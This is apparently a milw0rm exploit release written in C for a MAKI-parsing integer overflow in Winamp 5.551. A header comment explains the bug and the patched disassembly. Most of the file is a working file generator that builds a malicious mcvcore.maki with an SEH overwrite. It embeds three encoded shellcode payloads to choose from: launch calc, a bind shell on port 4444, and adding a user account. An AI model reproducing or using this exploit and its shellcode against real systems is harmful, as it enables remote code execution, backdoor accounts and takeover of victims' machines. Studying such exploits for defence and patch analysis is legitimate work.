/**************************************************************
Winamp 5.551 MAKI Parsing Integer Overflow Exploit !!!

Tested on :Vista sp1 and Xpsp3
Release Date :May 22 2009
Venders web site :http://www.winamp.com/
Version Tested:Winamp 5.551
Not vulnerable :Winamp 5.552

Credits to Monica Sojeong Hong down at vrt-sourcefire for the overflow.
http://vrt-sourcefire.blogspot.com

As we know we are able to overwrite the exception handlers so
we can exploit this on multiple OS i tested these on xpsp3 <eng>
<Vista sp1> And all worked fine.

I wrote the exploits because i had tried the 2 exploits posted
on milw0rm they were tested on winxp sp3 and vista sp1 and i couldn't
get them to execute shell code which prompted me into writing my
own version!!

Below i have provided a look into the disassembly of the new
changes in the 555.2 version of winamp the main change was in
gen_ff.dll.

---snip--

A quick look at the new gen_ff.dll.
----------------------------------
loc_12094F62:
mov     ax, [ebx]
movzx   edi, ax       -Extends ax into edi register.-
inc     ebx
push    edi             ; Size
inc     ebx
lea     eax, [ebp+MultiByteStr]
push    ebx             ; Src
push    eax             ; Dst
call    memmove
------------------------
loc_120951E9:
mov     edi, [ebx]
add     ebx, 4
mov     ax, [ebx]
movzx   esi, ax        -Extends ax into esi register.-
inc     ebx
push    esi             ; Size
inc     ebx
lea     eax, [ebp+var_2014C]  <-- This was also changed.
push    ebx             ; Src
push    eax             ; Dst
call    memmove

This is a simple run down of the new patch
that was applied to winamp winamp 5.552 If we look closely we can see they
changed the sign extension.


=555.1 .dll=
 ----------
movsx esi, ax  = movsx(dest , source );
Copies source operand dest and extends the value.


Changed in the new gen_ff.dll.
=555.2 .dll=
 ----------
movzx esi, ax

Zero extend the 8 bit registers.
Copies data and sign extends the data while copying it.

Destination= 16 - 32 bit.
Source =     8 or a 16byte or maybe even 1 byte of memory
Source =     the destination must be of greater value than the source.

This was a few of the changes within the new dll from winamp.Im
sure if you want to dig deeper you can get both dll and compare them
to see the changes that are made.So basically they have changed the
instruction from Copy with sign extension to copy with zero extension.

This can also be displayed when looking at the stack at the time of the
exception in the new version of winamp after steeping through the exception
although we can cause and exception we cant overwrite the 4 bytes on the
stack we can only overwrite 2 and it is always capped with 00FF.

---snip--

Special thanks to str0ke :)

Credits to n00b for writing exploit code !!
Progression is always a good thing.
----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!

***************************************************************/

#include <stdio.h>
#define MAKI "mcvcore.maki"



unsigned char First_Header[] =
{
    0x46, 0x47, 0x03, 0x04, 0x17, 0x00, 0x00, 0x00, 0x2A, 0x00, 0x00, 0x00,
    0x71, 0x49, 0x65, 0x51, 0x87, 0x0D, 0x51, 0x4A, 0x91, 0xE3, 0xA6, 0xB5,
    0x32, 0x35, 0xF3, 0xE7, 0x64, 0x0F, 0xF5, 0xD6, 0xFA, 0x93, 0xB7, 0x49,
    0x93, 0xF1, 0xBA, 0x66, 0xEF, 0xAE, 0x3E, 0x98, 0x7B, 0xC4, 0x0D, 0xE9,
    0x0D, 0x84, 0xE7, 0x4A, 0xB0, 0x2C, 0x04, 0x0B, 0xD2, 0x75, 0xF7, 0xFC,
    0xB5, 0x3A, 0x02, 0xB2, 0x4D, 0x43, 0xA1, 0x4B, 0xBE, 0xAE, 0x59, 0x63,
    0x75, 0x03, 0xF3, 0xC6, 0x78, 0x57, 0xC6, 0x87, 0x43, 0xE7, 0xFE, 0x49,
    0x85, 0xF9, 0x09, 0xCC, 0x53, 0x2A, 0xFD, 0x56, 0x65, 0x36, 0x60, 0x38,
    0x1B, 0x46, 0xA7, 0x42, 0xAA, 0x75, 0xD8, 0x3F, 0x66, 0x67, 0xBF, 0x73,
    0xF4, 0x7A, 0x78, 0xF4, 0xBB, 0xB2, 0xF7, 0x4E, 0x9C, 0xFB, 0xE7, 0x4B,
    0xA9, 0xBE, 0xA8, 0x8D, 0x02, 0x0C, 0x37, 0x3A, 0xBF, 0x3C, 0x9F, 0x43,
    0x84, 0xF1, 0x86, 0x88, 0x5B, 0xCF, 0x1E, 0x36, 0xB6, 0x5B, 0x0C, 0x5D,
    0xE1, 0x7D, 0x1F, 0x4B, 0xA7, 0x0F, 0x8D, 0x16, 0x59, 0x94, 0x19, 0x41,
    0x99, 0xE1, 0xE3, 0x4E, 0x36, 0xC6, 0xEC, 0x4B, 0x97, 0xCD, 0x78, 0xBC,
    0x9C, 0x86, 0x28, 0xB0, 0xE5, 0x95, 0xBE, 0x45, 0x72, 0x20, 0x91, 0x41,
    0x93, 0x5C, 0xBB, 0x5F, 0xF9, 0xF1, 0x17, 0xFD, 0x4E, 0x6D, 0x90, 0x60,
    0x7E, 0x53, 0x2E, 0x48, 0xB0, 0x04, 0xCC, 0x94, 0x61, 0x88, 0x56, 0x72,
    0xC0, 0xBC, 0x3A, 0x40, 0x22, 0x6F, 0xD6, 0x4B, 0x8B, 0xA4, 0x10, 0xC8,
    0x29, 0x93, 0x25, 0x47, 0x4D, 0x3E, 0xAA, 0x97, 0xD0, 0xF4, 0xA8, 0x4F,
    0x81, 0x7B, 0x0D, 0x0A, 0xF2, 0x2A, 0x45, 0x49, 0x83, 0xFA, 0xBB, 0xE4,
    0x64, 0xF4, 0x81, 0xD9, 0x49, 0xB0, 0xC0, 0xA8, 0x5B, 0x2E, 0xC3, 0xBC,
    0xFD, 0x3F, 0x5E, 0xB6, 0x62, 0x5E, 0x37, 0x8D, 0x40, 0x8D, 0xEA, 0x76,
    0x81, 0x4A, 0xB9, 0x1B, 0x77, 0xBE, 0x97, 0x4F, 0xCE, 0xB0, 0x77, 0x19,
    0x4E, 0x99, 0x56, 0xD4, 0x98, 0x33, 0xC9, 0x6C, 0x27, 0x0D, 0x20, 0xC2,
    0xA8, 0xEB, 0x51, 0x2A, 0x4B, 0xBA, 0x7F, 0x5D, 0x4B, 0xC6, 0x5D, 0x4C,
    0x71, 0x38, 0xBA, 0x1E, 0x8D, 0x9E, 0x48, 0x3E, 0x48, 0xB9, 0x60, 0x8D,
    0x1F, 0x43, 0xC5, 0xC4, 0x05, 0x40, 0xC9, 0x08, 0x0F, 0x39, 0xAF, 0x23,
    0x4B, 0x80, 0xF3, 0xB8, 0xC4, 0x8F, 0x7E, 0xBB, 0x59, 0x72, 0x86, 0xAA,
    0xEF, 0x0E, 0x31, 0xFA, 0x41, 0xB7, 0xDC, 0x85, 0xA9, 0x52, 0x5B, 0xCB,
    0x4B, 0x44, 0x32, 0xFD, 0x7D, 0x51, 0x37, 0x7C, 0x4E, 0xBF, 0x40, 0x82,
    0xAE, 0x5F, 0x3A, 0xDC, 0x33, 0x15, 0xFA, 0xB9, 0x5A, 0x7D, 0x9A, 0x57,
    0x45, 0xAB, 0xC8, 0x65, 0x57, 0xA6, 0xC6, 0x7C, 0xA9, 0xCD, 0xDD, 0x8E,
    0x69, 0x1E, 0x8F, 0xEC, 0x4F, 0x9B, 0x12, 0xF9, 0x44, 0xF9, 0x09, 0xFF,
    0x45, 0x27, 0xCD, 0x64, 0x6B, 0x26, 0x5A, 0x4B, 0x4C, 0x8C, 0x59, 0xE6,
    0xA7, 0x0C, 0xF6, 0x49, 0x3A, 0xE4, 0x05, 0xCB, 0x6D, 0xC4, 0x8A, 0xC2,
    0x48, 0xB1, 0x93, 0x49, 0xF0, 0x91, 0x0E, 0xF5, 0x4A, 0xFF, 0xCF, 0xDC,
    0xB4, 0xFE, 0x81, 0xCC, 0x4B, 0x96, 0x1B, 0x72, 0x0F, 0xD5, 0xBE, 0x0F,
    0xFF, 0xE1, 0x8C, 0xE2, 0x01, 0x59, 0xB0, 0xD5, 0x11, 0x97, 0x9F, 0xE4,
    0xDE, 0x6F, 0x51, 0x76, 0x0D, 0x0A, 0xBD, 0xF8, 0xF0, 0x80, 0xA5, 0x1B,
    0xA6, 0x42, 0xA0, 0x93, 0x32, 0x36, 0xA0, 0x0C, 0x8D, 0x4A, 0x1B, 0x34,
    0x2E, 0x9B, 0x98, 0x6C, 0xFA, 0x40, 0x8B, 0x85, 0x0C, 0x1B, 0x6E, 0xE8,
    0x94, 0x05, 0x71, 0x9B, 0xD5, 0x36, 0xFD, 0x03, 0xF8, 0x4A, 0x97, 0x95,
    0x05, 0x02, 0xB7, 0xDB, 0x26, 0x7A, 0x10, 0xF2, 0xD5, 0x7F, 0xC4, 0xAC,
    0xDF, 0x48, 0xA6, 0xA0, 0x54, 0x51, 0x57, 0x6C, 0xDC, 0x76, 0x35, 0xA5,
    0xBA, 0xB5, 0xB3, 0x05, 0xCB, 0x4D, 0xAD, 0xC1, 0xE6, 0x18, 0xD2, 0x8F,
    0x68, 0x96, 0xC1, 0xFE, 0x29, 0x61, 0xB7, 0xDA, 0x51, 0x4D, 0x91, 0x65,
    0x01, 0xCA, 0x0C, 0x1B, 0x70, 0xDB, 0xF7, 0x14, 0x95, 0xD5, 0x36, 0xED,
    0xE8, 0x45, 0x98, 0x0F, 0x3F, 0x4E, 0xA0, 0x52, 0x2C, 0xD9, 0x82, 0x4B,
    0x3B, 0x9B, 0x7A, 0x66, 0x0E, 0x42, 0x8F, 0xFC, 0x79, 0x41, 0x15, 0x80,
    0x9C, 0x02, 0x99, 0x31, 0xED, 0xC7, 0x19, 0x53, 0x98, 0x47, 0x98, 0x63,
    0x60, 0xB1, 0x5A, 0x29, 0x8C, 0xAA, 0x4D, 0xC1, 0xBB, 0xE2, 0xF6, 0x84,
    0x73, 0x41, 0xBD, 0xB3, 0xB2, 0xEB, 0x2F, 0x66, 0x55, 0x50, 0x94, 0x05,
    0xC0, 0x73, 0x1F, 0x96, 0x1B, 0x40, 0x9B, 0x1B, 0x67, 0x24, 0x27, 0xAC,
    0x41, 0x65, 0x22, 0xBA, 0x3D, 0x59, 0x77, 0xD0, 0x76, 0x49, 0xB9, 0x52,
    0xF4, 0x71, 0x36, 0x55, 0x40, 0x0B, 0x82, 0x02, 0x03, 0xD4, 0xAB, 0x3A,
    0x87, 0x4D, 0x87, 0x8D, 0x12, 0x32, 0x6F, 0xAD, 0xFC, 0xD5, 0x83, 0xC2,
    0xDE, 0x24, 0x6E, 0xB7, 0x36, 0x4A, 0x8C, 0xCC, 0x9E, 0x24, 0xC4, 0x6B,
    0x6C, 0x73, 0x37, 0x00
};

/*Trigger the Integer overflow*/
unsigned char Exception [] =
{
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF
};


/* win32_exec -  EXITFUNC=seh CMD=Calc Size=343
Encoder=PexAlphaNum http://metasploit.com */

char Calc_ShellCode [] =
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
    "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
    "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
    "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
    "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
    "\x42\x50\x42\x30\x42\x50\x4b\x58\x45\x34\x4e\x43\x4b\x48\x4e\x37"
    "\x45\x50\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x34\x4a\x41\x4b\x58"
    "\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x43\x4b\x38"
    "\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
    "\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
    "\x46\x4f\x4b\x43\x46\x55\x46\x42\x46\x50\x45\x37\x45\x4e\x4b\x48"
    "\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x30\x4b\x54"
    "\x4b\x58\x4f\x35\x4e\x51\x41\x30\x4b\x4e\x4b\x38\x4e\x41\x4b\x58"
    "\x41\x30\x4b\x4e\x49\x58\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x43"
    "\x42\x4c\x46\x46\x4b\x38\x42\x54\x42\x33\x45\x38\x42\x4c\x4a\x57"
    "\x4e\x50\x4b\x58\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a"
    "\x4b\x48\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
    "\x42\x30\x42\x50\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x45\x41\x33"
    "\x48\x4f\x42\x46\x48\x35\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
    "\x42\x35\x4a\x56\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x46\x4a\x49"
    "\x50\x4f\x4c\x48\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x34\x41\x36"
    "\x4e\x46\x43\x36\x42\x50\x5a";

/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=709
Encoder=PexAlphaNum http://metasploit.com */

char Bind_Shellcode [] =
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
    "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
    "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
    "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
    "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
    "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48"
    "\x4e\x36\x46\x52\x46\x42\x4b\x58\x45\x54\x4e\x43\x4b\x38\x4e\x47"
    "\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x48"
    "\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x33\x4b\x58"
    "\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x38\x42\x4c"
    "\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
    "\x46\x4f\x4b\x53\x46\x55\x46\x42\x4a\x42\x45\x47\x45\x4e\x4b\x48"
    "\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x56\x4b\x38\x4e\x30\x4b\x54"
    "\x4b\x48\x4f\x55\x4e\x31\x41\x30\x4b\x4e\x43\x50\x4e\x42\x4b\x38"
    "\x49\x48\x4e\x56\x46\x42\x4e\x31\x41\x56\x43\x4c\x41\x33\x4b\x4d"
    "\x46\x56\x4b\x48\x43\x34\x42\x33\x4b\x48\x42\x44\x4e\x30\x4b\x48"
    "\x42\x57\x4e\x31\x4d\x4a\x4b\x38\x42\x34\x4a\x30\x50\x45\x4a\x46"
    "\x50\x38\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x56"
    "\x43\x45\x48\x36\x4a\x36\x43\x53\x44\x53\x4a\x56\x47\x57\x43\x37"
    "\x44\x53\x4f\x45\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
    "\x4e\x4f\x4b\x33\x42\x55\x4f\x4f\x48\x4d\x4f\x35\x49\x58\x45\x4e"
    "\x48\x56\x41\x48\x4d\x4e\x4a\x50\x44\x30\x45\x55\x4c\x56\x44\x30"
    "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45"
    "\x4f\x4f\x48\x4d\x43\x55\x43\x55\x43\x35\x43\x55\x43\x55\x43\x54"
    "\x43\x55\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x56\x4a\x46\x41\x51"
    "\x4e\x55\x48\x46\x43\x45\x49\x48\x41\x4e\x45\x49\x4a\x36\x46\x4a"
    "\x4c\x31\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x56\x42\x41"
    "\x41\x55\x45\x45\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
    "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x35\x45\x35\x4f\x4f\x42\x4d"
    "\x4a\x36\x45\x4e\x49\x34\x48\x58\x49\x54\x47\x45\x4f\x4f\x48\x4d"
    "\x42\x55\x46\x45\x46\x55\x45\x35\x4f\x4f\x42\x4d\x43\x49\x4a\x36"
    "\x47\x4e\x49\x47\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x55"
    "\x4f\x4f\x42\x4d\x48\x46\x4c\x56\x46\x46\x48\x36\x4a\x56\x43\x46"
    "\x4d\x36\x49\x38\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x32\x4e\x4c"
    "\x49\x38\x47\x4e\x4c\x46\x46\x44\x49\x58\x44\x4e\x41\x43\x42\x4c"
    "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x32\x50\x4f\x44\x54\x4e\x42"
    "\x43\x39\x4d\x48\x4c\x57\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
    "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x44\x4f\x4f"
    "\x48\x4d\x4b\x35\x47\x45\x44\x55\x41\x45\x41\x45\x41\x55\x4c\x36"
    "\x41\x30\x41\x35\x41\x45\x45\x35\x41\x55\x4f\x4f\x42\x4d\x4a\x46"
    "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x36"
    "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x48\x47\x45\x4e\x4f"
    "\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
    "\x4a\x56\x42\x4f\x4c\x48\x46\x30\x4f\x45\x43\x35\x4f\x4f\x48\x4d"
    "\x4f\x4f\x42\x4d\x5a";

/* win32_adduser -  PASS=n00b EXITFUNC=seh USER=n00b Size=489
Encoder=PexAlphaNum http://metasploit.com */

char Add_User_Shellcode [] =
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
    "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
    "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
    "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
    "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
    "\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x48\x4e\x57"
    "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x38"
    "\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x43\x4b\x48"
    "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"
    "\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
    "\x46\x4f\x4b\x33\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"
    "\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x30\x4b\x44"
    "\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x58"
    "\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43"
    "\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x47"
    "\x4e\x50\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x37\x4e\x41\x4d\x4a"
    "\x4b\x58\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b"
    "\x42\x30\x42\x30\x42\x50\x4b\x38\x4a\x46\x4e\x33\x4f\x35\x41\x43"
    "\x48\x4f\x42\x56\x48\x35\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x37"
    "\x42\x45\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x35\x4a\x46\x4a\x49"
    "\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x4d\x56"
    "\x46\x56\x50\x52\x45\x36\x4a\x57\x45\x56\x42\x42\x4f\x32\x43\x46"
    "\x42\x52\x50\x56\x45\x46\x46\x57\x42\x42\x45\x57\x43\x37\x45\x36"
    "\x44\x57\x42\x32\x50\x46\x42\x43\x42\x53\x44\x56\x42\x42\x50\x36"
    "\x42\x53\x42\x43\x44\x36\x42\x42\x4f\x32\x41\x54\x46\x44\x46\x44"
    "\x42\x42\x48\x32\x48\x52\x42\x52\x50\x36\x45\x56\x46\x47\x42\x52"
    "\x4e\x56\x4f\x36\x43\x36\x41\x56\x4e\x56\x47\x56\x44\x57\x4f\x56"
    "\x45\x47\x42\x37\x42\x42\x41\x54\x46\x46\x4d\x56\x49\x46\x50\x56"
    "\x49\x46\x43\x57\x46\x57\x44\x37\x41\x56\x46\x37\x4f\x36\x44\x57"
    "\x43\x47\x42\x42\x50\x46\x42\x43\x42\x33\x44\x46\x42\x42\x4f\x52"
    "\x41\x44\x46\x44\x46\x44\x42\x30\x5a";


unsigned char Junk1 ='A';

int main()
{
    FILE *fp;
    int i;

    if ((fp = fopen(MAKI, "wb")) == NULL)
    {
        printf("File %s write error\n", MAKI);
        return(0);
    }

    for (i=0; i<sizeof(First_Header); i++)
        fputc(First_Header[i], fp);

    for (i=0; i<sizeof(Exception); i++)
        fputc(Exception[i], fp);

    for (i=0;i<16751;i++)
    {
        fwrite(&Junk1,1,1,fp);
    }
    fputs("\xeb\x06\x90\x90",fp);/*Pointer to next seh record */
    fputs("\x7C\x14\xF0\x12",fp);/*SE handler Universal adress 12F0147C */

    int input;


    printf("\n------------------------------------------------------");
    printf("\nWinamp 5.551 MAKI Parsing Integer Overflow Exploit !!!");
    printf("\n\nExploit created by n00b");
    printf( "\n[1]. Calc Shell_Code" );
    printf( "\n[2]. Bind Shell_Code on port 4444" );
    printf( "\n[3]. Add user Shell_Code" );
    printf( "\n[4]. To exit and cancel" );
    printf( "\nPlease chose your Shell_Code:" );
    scanf( "%d", &input );
    switch ( input )
    {
    case 1:
        for (i=0; i<sizeof(Calc_ShellCode); i++)
            fputc(Calc_ShellCode[i], fp);
        break;
    case 2:
        for (i=0; i<sizeof(Bind_Shellcode); i++)
            fputc(Bind_Shellcode[i], fp);
        break;
    case 3:
        for (i=0; i<sizeof(Add_User_Shellcode); i++)
            fputc(Add_User_Shellcode[i], fp);
        break;
    case 4:
        return 0;
        break;
    }
    fclose(fp);
    return 0;
}

// milw0rm.com [2009-05-26]
